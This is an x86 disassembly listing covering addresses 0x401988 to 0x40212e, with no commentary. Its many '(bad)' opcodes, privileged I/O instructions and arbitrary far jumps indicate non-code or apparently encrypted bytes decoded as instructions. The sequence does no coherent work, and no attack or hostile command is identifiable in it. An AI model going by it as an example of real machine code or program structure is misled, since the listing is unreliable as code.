  401988:	or     BYTE PTR [eax+0x25973c93],ch
  40198e:	cld    
  40198f:	and    bh,ch
  401991:	fcom   st(2)
  401993:	pop    ebx
  401994:	add    BYTE PTR [ebp+0x4effea75],ah
  40199a:	(bad)
  40199d:	lock push ebp
  40199f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019a0:	gs xchg esp,eax
  4019a2:	aam    0x10
  4019a4:	in     eax,dx
  4019a5:	mov    cl,0x3b
  4019a7:	push   ss
  4019a8:	adc    BYTE PTR [esi+ebp*4],dh
  4019ab:	jecxz  0x401998
  4019ad:	in     al,dx
  4019ae:	cmp    dl,BYTE PTR [ebx+ecx*1+0x55]
  4019b2:	push   esp
  4019b3:	sbb    al,0x1f
  4019b5:	cwde   
  4019b6:	or     DWORD PTR [eax],ebx
  4019b8:	xor    bl,dl
  4019ba:	mov    ah,0xa3
  4019bc:	xchg   edi,eax
  4019bd:	int3   
  4019be:	nop
  4019bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019c0:	jb     0x401a27
  4019c2:	mov    al,ch
  4019c4:	mov    ds:0x1bb4665d,al
  4019c9:	sbb    DWORD PTR [edx-0x32],ebp
  4019cc:	inc    edx
  4019cd:	test   al,0xd2
  4019cf:	sbb    ebx,eax
  4019d1:	pop    ecx
  4019d2:	int    0xdf
  4019d4:	stc    
  4019d5:	test   DWORD PTR [eax+0x48d7b37b],esi
  4019db:	retf   
  4019dc:	(bad)  
  4019dd:	fstp   TBYTE PTR [edi]
  4019df:	dec    eax
  4019e0:	push   eax
  4019e1:	sbb    bh,dh
  4019e3:	ss aad 0x9c
  4019e6:	ror    DWORD PTR [edx-0x2e],0xf9
  4019ea:	or     BYTE PTR [ebp-0xf],al
  4019ed:	mov    ch,0x5a
  4019ef:	ja     0x401a21
  4019f1:	les    edi,FWORD PTR [edi-0x623ff0ed]
  4019f7:	imul   ebp,DWORD PTR [edx-0x6a],0x88bf0c10
  4019fe:	arpl   WORD PTR [edx+0x77bb67a2],dx
  401a04:	push   esi
  401a05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a06:	jno    0x401a07
  401a08:	mov    DWORD PTR [edi],esp
  401a0a:	fisub  DWORD PTR [edx]
  401a0c:	push   ss
  401a0d:	ja     0x40199e
  401a0f:	int3   
  401a10:	push   0x45c9cee8
  401a15:	xor    DWORD PTR [eax-0x4b],esp
  401a18:	jge    0x4019ff
  401a1a:	rcr    BYTE PTR [ecx-0x10],cl
  401a1d:	mov    cl,0xa7
  401a1f:	cmp    al,0x6e
  401a21:	adc    BYTE PTR ss:[esi-0x66],cl
  401a25:	fsubr  DWORD PTR [esi]
  401a27:	dec    ebp
  401a28:	push   cs
  401a29:	retf   0x4d5e
  401a2c:	lea    eax,[ebx]
  401a2e:	add    dl,bh
  401a30:	enter  0x8607,0x5f
  401a34:	jo     0x4019f2
  401a36:	fisubr DWORD PTR [ebx+edx*4+0x54]
  401a3a:	ror    DWORD PTR [ebp+0x20],0x21
  401a3e:	mov    bl,0xc8
  401a40:	jmp    0x385f:0x32294e2
  401a47:	sub    eax,0x6b541cbb
  401a4c:	pop    ebx
  401a4d:	inc    esp
  401a4e:	(bad)  
  401a4f:	call   0xea85c61
  401a54:	outs   dx,BYTE PTR ds:[esi]
  401a55:	retf   
  401a56:	sbb    BYTE PTR [eax+0x2439e21e],0x4e
  401a5d:	inc    ecx
  401a5e:	aad    0x55
  401a60:	std    
  401a61:	pop    ds
  401a62:	pop    ds
  401a63:	jle    0x401a09
  401a65:	call   0xfb7e:0x9b684d01
  401a6c:	dec    ebp
  401a6d:	outs   dx,BYTE PTR ds:[esi]
  401a6e:	xor    bh,dl
  401a70:	lds    edx,FWORD PTR [edi-0x58d906c5]
  401a76:	push   ebx
  401a77:	ror    esi,0x78
  401a7a:	mov    WORD PTR [edx-0x2928ae51],ds
  401a80:	test   eax,0x19b727e0
  401a85:	mov    bh,0x49
  401a87:	fwait
  401a88:	add    bl,BYTE PTR [edx-0xd]
  401a8b:	xchg   edi,eax
  401a8c:	push   cs
  401a8d:	xchg   ebp,eax
  401a8e:	or     BYTE PTR [esi-0x57],al
  401a91:	cwde   
  401a92:	stos   BYTE PTR es:[edi],al
  401a93:	in     eax,0x4
  401a95:	(bad)  
  401a96:	push   ebx
  401a97:	sbb    ebx,DWORD PTR [esi-0x9e10292]
  401a9d:	adc    bl,BYTE PTR [edx]
  401a9f:	shl    BYTE PTR [esi+0x7e],0xe6
  401aa3:	mov    eax,0x4179f55a
  401aa8:	(bad)  
  401aa9:	repz jnp 0x401a2d
  401aac:	push   ds
  401aad:	cmp    eax,0x2641d4c3
  401ab2:	leave  
  401ab3:	jge    0x401a6f
  401ab5:	push   0xffffffc3
  401ab7:	outs   dx,BYTE PTR ds:[esi]
  401ab8:	sub    eax,0x9c33d62c
  401abd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401abe:	and    BYTE PTR [edi+0x65],ah
  401ac1:	sti    
  401ac2:	stc    
  401ac3:	js     0x401a52
  401ac5:	ins    DWORD PTR es:[edi],dx
  401ac6:	mov    eax,0x40eb11
  401acb:	popf   
  401acc:	jbe    0x401a9b
  401ace:	ret    
  401acf:	mov    al,ds:0x4b40e19b
  401ad4:	mov    ds:0x76a8d87a,al
  401ad9:	and    dl,BYTE PTR [edi]
  401adb:	and    BYTE PTR [edx-0x4283cb3b],bh
  401ae1:	shl    DWORD PTR [ecx-0x4b],0x5d
  401ae5:	(bad)  
  401ae6:	popf   
  401ae7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ae8:	repz and bl,0x83
  401aec:	xor    eax,0x63cc91a9
  401af1:	js     0x401af1
  401af3:	add    cl,BYTE PTR [ebp-0x77f87501]
  401af9:	lods   al,BYTE PTR ds:[esi]
  401afa:	aaa    
  401afb:	lahf   
  401afc:	sti    
  401afd:	and    DWORD PTR [edi],eax
  401aff:	push   0xffffffa6
  401b01:	fwait
  401b02:	add    al,0xda
  401b04:	lock xor cl,al
  401b07:	(bad)
  401b0a:	xchg   edx,eax
  401b0b:	lds    esi,FWORD PTR [edi]
  401b0d:	inc    ecx
  401b0e:	jns    0x401b0d
  401b10:	xchg   ebp,eax
  401b11:	pushf  
  401b12:	pop    eax
  401b13:	cmp    DWORD PTR [edi],ecx
  401b15:	mov    ds:0x722c94fd,eax
  401b1a:	jno    0x401abd
  401b1c:	inc    ecx
  401b1d:	test   esp,edi
  401b1f:	(bad)  
  401b20:	fwait
  401b21:	mov    DWORD PTR [edi+0x150ea0e5],edx
  401b27:	or     al,0x82
  401b29:	cdq    
  401b2a:	mov    DWORD PTR [ebp-0x5a84838e],esp
  401b30:	cdq    
  401b31:	gs (bad) 
  401b33:	jle    0x401b2d
  401b35:	sbb    DWORD PTR [ecx-0x63],edx
  401b38:	bound  ebp,QWORD PTR [esi-0xf4b6959]
  401b3e:	aad    0xef
  401b40:	sbb    DWORD PTR [esp+ecx*4],ebp
  401b43:	mov    DWORD PTR [ebp-0x6],edi
  401b46:	loope  0x401b6f
  401b48:	in     eax,0x68
  401b4a:	test   BYTE PTR [esi+0x698abd7b],ch
  401b50:	bound  esp,QWORD PTR [edx]
  401b52:	sub    ch,BYTE PTR [ebp+edi*8-0x4a]
  401b56:	dec    edx
  401b57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b58:	cmc    
  401b59:	in     eax,dx
  401b5a:	inc    ebx
  401b5b:	sub    ebp,edi
  401b5d:	scas   eax,DWORD PTR es:[edi]
  401b5e:	mov    ebp,0xe3e9bb17
  401b63:	nop
  401b64:	rol    DWORD PTR [edx-0x512bcc44],0x11
  401b6b:	test   BYTE PTR [eax],al
  401b6d:	gs (bad) 
  401b6f:	retf   
  401b70:	and    eax,0x9e8c5e7f
  401b75:	sub    al,0x5e
  401b77:	dec    edx
  401b78:	jecxz  0x401b1e
  401b7a:	or     ch,BYTE PTR [ecx-0x26a391d8]
  401b80:	pop    ecx
  401b81:	in     eax,dx
  401b82:	shl    bh,cl
  401b84:	out    dx,eax
  401b85:	call   0x9b0f:0xd7c50577
  401b8c:	mov    eax,ds:0xb7f51347
  401b91:	cmp    cl,dl
  401b93:	mov    bh,0x99
  401b95:	mov    esp,0x7582b52f
  401b9a:	sbb    cl,BYTE PTR [edi-0x1]
  401b9d:	or     BYTE PTR [edi+edx*8],0x27
  401ba1:	jns    0x401c22
  401ba3:	gs mov eax,ebx
  401ba6:	repnz mov cl,0x2b
  401ba9:	adc    eax,0x5e8e75a9
  401bae:	add    ebx,DWORD PTR [edx-0x4e]
  401bb1:	fmul   DWORD PTR ds:0xe4ec1ac
  401bb7:	int3   
  401bb8:	out    dx,eax
  401bb9:	xchg   ebx,eax
  401bba:	or     ch,BYTE PTR [ebx+0x1e]
  401bbd:	das    
  401bbe:	cmp    esi,DWORD PTR [edx+0x67bb475d]
  401bc4:	lahf   
  401bc5:	aam    0x30
  401bc7:	out    dx,eax
  401bc8:	cmp    eax,0x1cd25b4a
  401bcd:	lods   eax,DWORD PTR ds:[esi]
  401bce:	jns    0x401ba6
  401bd0:	mov    edx,DWORD PTR [ebp-0x711dea90]
  401bd6:	inc    eax
  401bd7:	mov    edi,0xe52fbc7b
  401bdc:	and    eax,0x2711137c
  401be1:	(bad)  
  401be3:	fst    st(6)
  401be5:	nop
  401be6:	iret   
  401be7:	fadd   st(6),st
  401be9:	ror    DWORD PTR [ecx],0x77
  401bec:	(bad)  
  401bed:	idiv   DWORD PTR [ecx]
  401bef:	loope  0x401c37
  401bf1:	and    DWORD PTR [edi-0x2068a45],eax
  401bf7:	call   ecx
  401bf9:	outs   dx,BYTE PTR ds:[esi]
  401bfa:	cdq    
  401bfb:	mov    ecx,0xb16e16d7
  401c00:	fild   DWORD PTR [edi]
  401c02:	loopne 0x401bd4
  401c04:	sub    DWORD PTR [edi-0x47],0x25
  401c08:	inc    ebx
  401c09:	daa    
  401c0a:	and    ebp,ecx
  401c0c:	mov    edi,0x5a1e14e1
  401c11:	lock or al,BYTE PTR [ebp+0x72]
  401c15:	aad    0xc0
  401c17:	data16 or bl,BYTE PTR [edi+0x19]
  401c1b:	mov    al,0xc1
  401c1d:	inc    eax
  401c1e:	fild   WORD PTR [eax-0x5e]
  401c21:	neg    DWORD PTR [eax+ecx*1+0x2d99e67f]
  401c28:	cli    
  401c29:	mov    BYTE PTR [edi],0x7d
  401c2c:	mov    ecx,0x98a1bd44
  401c31:	push   0x71f2539f
  401c36:	cmp    DWORD PTR [eax-0x27],ecx
  401c39:	mov    al,0x5d
  401c3b:	adc    cl,BYTE PTR [ecx]
  401c3d:	xchg   esp,esi
  401c3f:	mov    bh,0xa
  401c41:	popa   
  401c42:	test   DWORD PTR [ecx*2+0x62264298],ebx
  401c49:	sbb    eax,0x5d90571
  401c4e:	and    al,0xdb
  401c50:	iret   
  401c51:	inc    ecx
  401c52:	and    eax,0xbb72ebdb
  401c57:	(bad)  
  401c59:	jge    0x401c23
  401c5b:	adc    BYTE PTR [ecx],0x6c
  401c5e:	mov    edi,0x9c426959
  401c63:	jle    0x401c44
  401c65:	adc    eax,0xcc9cc433
  401c6a:	aas    
  401c6b:	xor    al,ch
  401c6d:	cli    
  401c6e:	pop    ss
  401c6f:	dec    esi
  401c70:	test   DWORD PTR [edi],edx
  401c72:	pop    esi
  401c73:	imul   ecx,DWORD PTR [esi+0x8],0xffffff80
  401c77:	je     0x401c69
  401c79:	adc    dh,ah
  401c7b:	mov    ebx,0x427523ce
  401c80:	pop    ecx
  401c81:	mov    ebx,0x5403fd88
  401c86:	jmp    0xeae523c6
  401c8b:	ret    
  401c8c:	inc    BYTE PTR [eax+esi*1-0x5c]
  401c90:	ds retf 
  401c92:	cmp    BYTE PTR [ecx],dh
  401c94:	retf   
  401c95:	scas   al,BYTE PTR es:[edi]
  401c96:	add    edi,DWORD PTR [ebx-0x1c36b572]
  401c9c:	mov    dh,0xda
  401c9e:	cmp    DWORD PTR [esi+esi*1-0x33],0x20d1f41f
  401ca6:	push   ebp
  401ca7:	int    0x19
  401ca9:	xor    ch,0x77
  401cac:	(bad)  [edx]
  401cae:	mov    al,0x46
  401cb0:	cmp    edi,DWORD PTR ds:[ebx-0x65]
  401cb4:	fdivr  QWORD PTR [edi+eiz*4]
  401cb7:	fxch   st(3)
  401cb9:	cdq    
  401cba:	or     al,0x5c
  401cbc:	iret   
  401cbd:	fadd   QWORD PTR [ebx]
  401cbf:	loope  0x401cef
  401cc1:	and    al,0x63
  401cc3:	sub    edi,DWORD PTR [edi-0x3c]
  401cc6:	cwde   
  401cc7:	mov    dl,0x85
  401cc9:	xchg   edi,eax
  401cca:	or     cl,BYTE PTR [edi-0x78e4a0ac]
  401cd0:	pop    ds
  401cd1:	jmp    0x401cce
  401cd3:	into   
  401cd4:	(bad)  
  401cd5:	outs   dx,BYTE PTR ds:[esi]
  401cd6:	adc    al,0x67
  401cd8:	push   esi
  401cd9:	and    bh,bh
  401cdb:	sar    DWORD PTR [esi+0x72b1d1e],1
  401ce1:	sub    DWORD PTR [eax-0x261ae295],0x2b4e58bc
  401ceb:	fild   QWORD PTR [ecx-0x6292293d]
  401cf1:	lock xchg DWORD PTR [edi-0x2d],esi
  401cf5:	dec    ebx
  401cf6:	jg     0x401cc6
  401cf8:	dec    ebx
  401cf9:	sahf   
  401cfa:	xchg   ebp,eax
  401cfb:	xor    eax,0x4af98466
  401d00:	cld    
  401d01:	xchg   edi,eax
  401d02:	inc    DWORD PTR [esp+ebx*8]
  401d05:	mov    al,0xf
  401d07:	hlt    
  401d08:	(bad)  
  401d09:	sahf   
  401d0a:	ret    0x4b2e
  401d0d:	or     DWORD PTR [ebx+0x34ac2bc3],ebp
  401d13:	cwde   
  401d14:	fstp   st(1)
  401d16:	ins    BYTE PTR es:[edi],dx
  401d17:	cli    
  401d18:	dec    ebx
  401d19:	adc    eax,0xee04e319
  401d1e:	inc    eax
  401d1f:	iret   
  401d20:	in     al,0x52
  401d22:	xor    edi,DWORD PTR [edx]
  401d24:	or     ebx,ebp
  401d26:	inc    esp
  401d27:	retf   0x5a9f
  401d2a:	(bad)  
  401d2b:	sub    BYTE PTR [esi+0x5c84372e],dl
  401d31:	paddw  mm6,mm7
  401d34:	pop    ebp
  401d35:	leave  
  401d36:	sbb    eax,0x15cad76b
  401d3b:	adc    al,0xf9
  401d3d:	rol    DWORD PTR [esi-0x2c],0xe2
  401d41:	clc    
  401d42:	push   ds
  401d43:	bound  edx,QWORD PTR [esi+eiz*2-0x15]
  401d47:	mov    ds,WORD PTR [edx+0x20]
  401d4a:	pop    es
  401d4b:	and    dl,al
  401d4d:	addr16 sbb eax,0x44ee3196
  401d53:	int3   
  401d54:	fcomp  QWORD PTR [ecx+0x52aa7008]
  401d5a:	daa    
  401d5b:	push   ecx
  401d5c:	jbe    0x401d40
  401d5e:	dec    bl
  401d60:	push   0xe081d9a2
  401d65:	cmp    al,0x80
  401d67:	lods   al,BYTE PTR ds:[esi]
  401d68:	sub    ah,ah
  401d6a:	pop    ss
  401d6b:	outs   dx,DWORD PTR ds:[esi]
  401d6c:	shr    DWORD PTR es:[edx+0x19],cl
  401d70:	shl    DWORD PTR [bx],cl
  401d73:	xchg   ecx,eax
  401d74:	test   BYTE PTR [ecx],0x64
  401d77:	xor    esp,esp
  401d79:	and    BYTE PTR [eax-0x4],cl
  401d7c:	addr16 (bad) 
  401d7e:	hlt    
  401d7f:	xchg   ecx,eax
  401d80:	rol    BYTE PTR [esi],cl
  401d82:	mov    ss,WORD PTR [ebx-0x6b]
  401d85:	push   es
  401d86:	sub    eax,0xc92764b0
  401d8b:	pop    edi
  401d8c:	xchg   esp,eax
  401d8d:	xchg   edi,eax
  401d8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d8f:	pop    esp
  401d90:	retf   0xd68d
  401d93:	daa    
  401d94:	dec    ecx
  401d95:	jns    0x401d7a
  401d97:	mov    esp,esi
  401d99:	jne    0x401e0c
  401d9b:	mov    esp,cs
  401d9d:	and    dh,BYTE PTR [edx]
  401d9f:	idiv   ebp
  401da1:	and    eax,0xd02d86ad
  401da6:	repz sub eax,esi
  401da9:	mov    eax,ds:0x2b4f72de
  401dae:	jne    0x401d44
  401db0:	inc    ebx
  401db1:	call   0xea80:0x505246b5
  401db8:	pusha  
  401db9:	push   0x1d15cefc
  401dbe:	sub    bl,BYTE PTR [ecx-0x42]
  401dc1:	jle    0x401d86
  401dc3:	xchg   esi,eax
  401dc4:	(bad)  [ebp-0x9144490]
  401dca:	in     al,0x7
  401dcc:	in     al,dx
  401dcd:	inc    ebx
  401dce:	test   DWORD PTR [edi+0x16],0x6e390cd4
  401dd5:	fistp  DWORD PTR [eax+0x1b]
  401dd8:	adc    esp,edi
  401dda:	sar    BYTE PTR [edi],0x3e
  401ddd:	xor    eax,0x28391432
  401de2:	sub    ch,BYTE PTR [ecx+0x14]
  401de5:	dec    edx
  401de6:	push   ebp
  401de7:	inc    esp
  401de8:	push   cs
  401de9:	in     al,dx
  401dea:	rol    BYTE PTR [edx],1
  401dec:	enter  0x9b69,0x4d
  401df0:	or     eax,0xa750c902
  401df5:	jo     0x401e08
  401df7:	scas   eax,DWORD PTR es:[edi]
  401df8:	ret    
  401df9:	push   esp
  401dfa:	scas   al,BYTE PTR es:[edi]
  401dfb:	add    edi,DWORD PTR [edx-0x541e268]
  401e01:	and    DWORD PTR [edi],eax
  401e03:	pop    ebx
  401e04:	and    BYTE PTR [edi+0x62803677],0x81
  401e0b:	jmp    0x401e65
  401e0d:	sbb    al,0x7a
  401e0f:	push   edi
  401e10:	retf   0x8128
  401e13:	(bad)
  401e16:	jle    0x401db1
  401e18:	mov    ch,0x31
  401e1a:	cmp    al,0x34
  401e1c:	adc    BYTE PTR [esi+0x7d3df641],bh
  401e22:	addr16 mov bl,0xfa
  401e25:	push   edi
  401e26:	jg     0x401dec
  401e28:	pop    esp
  401e29:	xchg   esi,eax
  401e2a:	paddsb mm0,QWORD PTR [ebx+0xee1e384]
  401e31:	xchg   ecx,eax
  401e32:	jecxz  0x401e58
  401e34:	jmp    0x401eb1
  401e36:	fnstsw WORD PTR [edx+0x678ee2be]
  401e3c:	adc    ebp,DWORD PTR [edx]
  401e3e:	xchg   BYTE PTR [eax+eiz*1+0x6c],bl
  401e42:	(bad)  
  401e43:	leave  
  401e44:	mov    al,0xde
  401e46:	cwde   
  401e47:	not    DWORD PTR [edi+ecx*2]
  401e4a:	add    ch,BYTE PTR [ebx+0x4a]
  401e4d:	and    ecx,DWORD PTR [edx]
  401e4f:	push   cs
  401e50:	xor    DWORD PTR [ecx*4+0x2b3f47ee],ebp
  401e57:	ret    0x7e06
  401e5a:	and    al,0xfa
  401e5c:	xchg   DWORD PTR [edx+edx*1-0x21b3edcc],esi
  401e63:	xchg   DWORD PTR [eax],edi
  401e65:	add    DWORD PTR [edi+0x12],edx
  401e68:	jl     0x401e5e
  401e6a:	fdivr  QWORD PTR [ebp-0x79]
  401e6d:	xchg   edx,eax
  401e6e:	push   ds
  401e6f:	mov    eax,0xc4cc872b
  401e74:	in     eax,0x5
  401e76:	outs   dx,BYTE PTR ds:[esi]
  401e77:	out    dx,al
  401e78:	sbb    eax,0x496dc38b
  401e7d:	mov    bl,0x96
  401e7f:	lock adc DWORD PTR [eax],esp
  401e82:	rcl    BYTE PTR ds:0x7dea1507,0x31
  401e89:	or     BYTE PTR [ebp-0x119461a],ah
  401e8f:	mov    esi,0x3829d06
  401e94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e95:	in     al,dx
  401e96:	dec    ebp
  401e97:	sub    ebx,ebx
  401e99:	dec    edx
  401e9a:	je     0x401f0c
  401e9c:	ret    
  401e9d:	ror    BYTE PTR [esi-0x6a66a940],cl
  401ea3:	gs in  eax,0x31
  401ea6:	mov    al,0xf8
  401ea8:	(bad)  
  401ea9:	and    al,BYTE PTR [esi+0x62db521d]
  401eaf:	mov    dh,0x9d
  401eb1:	mov    edx,0x177144ba
  401eb6:	mov    al,0x8b
  401eb8:	dec    edi
  401eb9:	dec    ebp
  401eba:	push   0xffffffca
  401ebc:	push   es
  401ebd:	lods   eax,DWORD PTR ds:[esi]
  401ebe:	dec    edi
  401ebf:	cmp    ebp,0x1de93641
  401ec5:	enter  0x23f3,0x92
  401ec9:	hlt    
  401eca:	or     eax,0x18cff671
  401ecf:	adc    eax,0x3e0816ca
  401ed4:	pop    esp
  401ed5:	cmp    ebp,ebp
  401ed7:	(bad)  
  401ed8:	sbb    al,0x75
  401eda:	int    0xda
  401edc:	ds ds hlt 
  401edf:	push   cs
  401ee0:	lods   al,BYTE PTR ds:[esi]
  401ee1:	clc    
  401ee2:	add    edx,edx
  401ee4:	cmp    BYTE PTR [esi],dh
  401ee6:	and    BYTE PTR [ecx-0x2a],bl
  401ee9:	std    
  401eea:	adc    al,BYTE PTR [ebx+0x45845db6]
  401ef0:	jecxz  0x401ecc
  401ef2:	int3   
  401ef3:	push   0xb7b309ef
  401ef8:	outs   dx,DWORD PTR ds:[esi]
  401ef9:	int    0xe4
  401efb:	or     DWORD PTR [eax-0x34],eax
  401efe:	push   edx
  401eff:	enter  0x103a,0x15
  401f03:	sub    DWORD PTR [esi+eiz*8-0x4b76c2ce],ebx
  401f0a:	xor    BYTE PTR [ecx+0x5f919928],al
  401f10:	outs   dx,DWORD PTR ds:[esi]
  401f11:	cmp    al,al
  401f13:	loop   0x401ec6
  401f15:	xor    bl,ch
  401f17:	icebp  
  401f18:	add    ebx,DWORD PTR [edx]
  401f1a:	or     ebx,DWORD PTR [edx]
  401f1c:	arpl   WORD PTR [edx-0x37e96c67],ax
  401f22:	aam    0xe
  401f24:	adc    ebx,DWORD PTR [esi+0x4d76db7a]
  401f2a:	out    0x6e,al
  401f2c:	imul   eax,DWORD PTR [ebp-0x355f76f9],0x73
  401f33:	jecxz  0x401ec9
  401f35:	adc    al,0x9b
  401f37:	into   
  401f38:	ja     0x401f38
  401f3a:	retf   
  401f3b:	jle    0x401edd
  401f3d:	mov    edx,ss
  401f3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f40:	inc    edx
  401f41:	aam    0x17
  401f43:	mov    eax,DWORD PTR [ebx]
  401f45:	scas   al,BYTE PTR es:[edi]
  401f46:	scas   al,BYTE PTR es:[edi]
  401f47:	or     DWORD PTR [edi+0x1d],esp
  401f4a:	inc    ecx
  401f4b:	in     al,0x24
  401f4d:	add    DWORD PTR [eax+0x22f4ef3d],0x13e170e1
  401f57:	loopne 0x401f38
  401f59:	ss das 
  401f5b:	out    dx,al
  401f5c:	ja     0x401f98
  401f5e:	and    dh,al
  401f60:	imul   eax,DWORD PTR [ebp-0x2be2e478],0x4f
  401f67:	imul   esp
  401f69:	sub    eax,0xb932a13b
  401f6e:	fcmovu st,st(6)
  401f70:	rcr    DWORD PTR [esi+edx*8-0x6453d239],0x1c
  401f78:	lods   eax,DWORD PTR ds:[esi]
  401f79:	mov    al,ds:0xd8be60fe
  401f7e:	mov    bl,0xd
  401f80:	ss mov al,0x81
  401f83:	and    DWORD PTR [ebx],edx
  401f85:	inc    ebx
  401f86:	adc    eax,0x5572cac8
  401f8b:	mov    bl,0x88
  401f8d:	sbb    al,0xc2
  401f8f:	dec    ecx
  401f90:	cmc    
  401f91:	cmc    
  401f92:	add    edx,DWORD PTR [eax]
  401f94:	fldcw  WORD PTR [eax+0x759a009c]
  401f9a:	xor    ebx,ebp
  401f9c:	stc    
  401f9d:	push   0x3b077a74
  401fa2:	mov    BYTE PTR [edx-0x52],dh
  401fa5:	xchg   esi,eax
  401fa6:	data16 hlt 
  401fa8:	sbb    al,BYTE PTR [esi-0xb]
  401fab:	adc    BYTE PTR [esp+ebp*8+0x7b],al
  401faf:	or     edx,DWORD PTR [ebx+0x68]
  401fb2:	fs pop es
  401fb4:	retf   
  401fb5:	add    DWORD PTR [edx],esi
  401fb7:	push   esp
  401fb8:	pop    ds
  401fb9:	mov    ebp,DWORD PTR [ebx]
  401fbb:	mov    esp,0x9b391eee
  401fc0:	dec    esi
  401fc1:	xor    esi,DWORD PTR [edx+0x3]
  401fc4:	mov    BYTE PTR [ebx-0x3f],dh
  401fc7:	fs ins BYTE PTR es:[edi],dx
  401fc9:	rcr    BYTE PTR [eax+0x46c67745],cl
  401fcf:	jmp    0x465d9e11
  401fd4:	loop   0x401fcb
  401fd6:	adc    al,0x23
  401fd8:	test   DWORD PTR [eax-0x8],0xbb76651f
  401fdf:	int    0x13
  401fe1:	fidiv  DWORD PTR [ebp+0x13a58a6d]
  401fe7:	pop    esp
  401fe8:	mov    bl,0xc2
  401fea:	adc    eax,0x8c39e9d6
  401fef:	jge    0x402049
  401ff1:	jecxz  0x401fc6
  401ff3:	push   esp
  401ff4:	mov    esp,0x1a6e40e5
  401ff9:	add    ecx,ecx
  401ffb:	jae    0x402053
  401ffd:	adc    ecx,DWORD PTR [ebp+0x3cad8fe0]
  402003:	jg     0x402042
  402005:	test   eax,0x103e864e
  40200a:	inc    ebx
  40200b:	fmul   QWORD PTR [esi]
  40200d:	push   0xffffffcf
  40200f:	add    cl,bl
  402011:	dec    esi
  402012:	add    cl,BYTE PTR [esi-0x5b9e9853]
  402018:	pusha  
  402019:	mov    ds:0xcf3534e9,al
  40201e:	mov    edx,0xb7d4e51b
  402023:	(bad)  
  402024:	stc    
  402025:	lock je 0x402048
  402028:	mov    al,0xe5
  40202a:	into   
  40202b:	xor    BYTE PTR [ebx-0x43],ch
  40202e:	ins    BYTE PTR es:[edi],dx
  40202f:	outs   dx,BYTE PTR ds:[esi]
  402030:	and    al,0xf2
  402032:	(bad)  
  402034:	inc    esp
  402035:	out    dx,eax
  402036:	adc    dl,ch
  402038:	loopne 0x402031
  40203a:	dec    eax
  40203b:	jg     0x402056
  40203d:	daa    
  40203e:	jne    0x402040
  402040:	or     edx,DWORD PTR [ebx-0x50]
  402043:	pop    ecx
  402044:	fwait
  402045:	outs   dx,BYTE PTR ds:[esi]
  402046:	and    eax,0xab86b781
  40204b:	xor    eax,0xb386a72c
  402050:	iret   
  402051:	loope  0x4020d2
  402053:	in     al,dx
  402054:	add    DWORD PTR [edi],esi
  402056:	dec    ecx
  402057:	sub    BYTE PTR [ebx-0x2a06c3dd],ah
  40205d:	push   esp
  40205e:	cld    
  40205f:	cdq    
  402060:	mov    gs,WORD PTR ds:0xb681ad9d
  402066:	adc    DWORD PTR [eax+0x54d015aa],edx
  40206c:	adc    al,0x0
  40206e:	cli    
  40206f:	(bad)  [ebp-0x576a562a]
  402075:	jmp    0x40202e
  402077:	dec    esi
  402078:	jecxz  0x4020a3
  40207a:	push   esp
  40207b:	jne    0x402017
  40207d:	shl    BYTE PTR [eax+0x42],0x3b
  402081:	xchg   esi,eax
  402082:	pop    ds
  402083:	jle    0x4020d5
  402085:	retf   
  402086:	or     al,0x26
  402088:	test   BYTE PTR [ebx+edi*1],0xa0
  40208c:	outs   dx,BYTE PTR ds:[esi]
  40208d:	pop    esi
  40208e:	ins    DWORD PTR es:[edi],dx
  40208f:	retf   
  402090:	std    
  402091:	jmp    0x40205e
  402093:	lods   eax,DWORD PTR ds:[esi]
  402094:	cmp    ah,BYTE PTR [ebp-0x19]
  402097:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402098:	cmp    al,0x7
  40209a:	into   
  40209b:	mov    eax,ds:0x470d9128
  4020a0:	mov    dh,0x98
  4020a2:	mov    edx,0x558f4629
  4020a7:	lods   al,BYTE PTR ds:[esi]
  4020a8:	movntps XMMWORD PTR [edi*8+0x656b98e0],xmm0
  4020b0:	and    bl,al
  4020b2:	jno    0x402068
  4020b4:	(bad)  
  4020b5:	sbb    esp,DWORD PTR ds:0xb84d857d
  4020bb:	pushf  
  4020bc:	mov    ch,0xeb
  4020be:	sub    edi,edx
  4020c0:	into   
  4020c1:	rol    DWORD PTR [edi-0x26],0x69
  4020c5:	cmp    DWORD PTR [ebx+0x2],esi
  4020c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020c9:	por    mm3,QWORD PTR [esi]
  4020cc:	jnp    0x402128
  4020ce:	push   esi
  4020cf:	jge    0x40205a
  4020d1:	ss push esp
  4020d3:	pop    eax
  4020d4:	pop    ds
  4020d5:	leave  
  4020d6:	cmp    esi,DWORD PTR [esi+0x2df27e3a]
  4020dc:	std    
  4020dd:	outs   dx,BYTE PTR ds:[esi]
  4020de:	fwait
  4020df:	dec    esi
  4020e0:	aad    0x3
  4020e2:	jbe    0x402139
  4020e4:	aaa    
  4020e5:	or     BYTE PTR [edx],cl
  4020e7:	add    al,0xda
  4020e9:	ror    DWORD PTR [edi],0x7f
  4020ec:	inc    ecx
  4020ed:	out    0x10,al
  4020ef:	xchg   ah,ch
  4020f1:	inc    edx
  4020f2:	imul   esp,DWORD PTR ds:0x9767f8e8,0x63
  4020f9:	cmp    al,0x20
  4020fb:	repz cmp DWORD PTR [edx+0x1f17f7dc],esp
  402102:	push   es
  402103:	aas    
  402104:	int    0x14
  402106:	cdq    
  402107:	in     al,dx
  402108:	xchg   edx,eax
  402109:	nop
  40210a:	enter  0xf713,0x37
  40210e:	push   ecx
  40210f:	mov    esi,0xc5cbf36c
  402114:	test   BYTE PTR [edi],bh
  402116:	jge    0x40218c
  402118:	scas   al,BYTE PTR es:[edi]
  402119:	hlt    
  40211a:	adc    ebp,DWORD PTR ds:[edx+0x7b7b24fd]
  402121:	push   esp
  402122:	clc    
  402123:	nop
  402124:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402125:	cs xor eax,0x6a518a90
  40212b:	pop    eax
  40212c:	push   ebx
  40212d:	push   ebx
  40212e:	push   edx
